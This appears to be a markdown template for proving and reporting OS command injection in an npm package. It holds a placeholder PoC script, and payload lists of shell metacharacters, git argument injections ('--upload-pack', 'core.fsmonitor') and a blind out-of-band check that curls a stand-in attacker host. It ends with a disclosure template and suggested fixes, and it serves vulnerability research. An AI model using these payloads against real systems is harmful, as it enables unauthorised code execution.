# PoC Skeleton -- Command Injection

## Basic PoC

```js
/**
 * CVE-CANDIDATE: Command Injection in [package-name] [version]
 * CWE: CWE-78 (OS Command Injection)
 * CVSS: 9.8 CRITICAL
 */
const pkg = require('[package-name]');

// Payload: semicolon breaks out of intended command
const payload = '; id';

const result = pkg.vulnerableMethod(payload);
console.log('[+] Command injection result:', result);
```

## Injection Payloads

### Shell Metacharacter Injection
```
; id                          # Command separator (Unix)
| id                          # Pipe
|| id                         # OR
&& id                         # AND
$(id)                         # Command substitution
\nid                          # Newline injection
```

### Argument Injection
```
--help                        # Verify arg injection
--upload-pack=id              # Git-specific RCE
-c core.fsmonitor=id          # Git config injection
--exec=id                     # Various tools
```

### Blind Injection Detection
```
; sleep 5                     # Time-based
; curl http://attacker.com    # Out-of-band
; touch /tmp/cmdi-proof       # File creation proof
```

## Evidence Collection

```bash
id                            # uid, gid
whoami                        # username
hostname                      # hostname
touch /tmp/cve-poc-evidence   # file creation proof
```

## Reporting Template

```
## Vulnerability: Command Injection in [function]

**File**: `src/[file].js:LINE`
**Sink**: shell execution at line LINE
**Source**: User input via `[parameter]`
**Data flow**: [entry] -> [processing] -> shell(tainted_string)
**Sanitization**: [none / insufficient]

### Impact
Remote Code Execution via shell metacharacter injection.

### Reproduction
1. Install: `npm install [package]@[version]`
2. Run: `node poc.js`
3. Observe: system command output proves arbitrary execution

### Suggested Fix
- Replace shell execution with execFile/spawn using argument arrays
- Add `--` separator before user-controlled arguments
- Apply escapeshellarg() / shlex.quote() on all user input
```
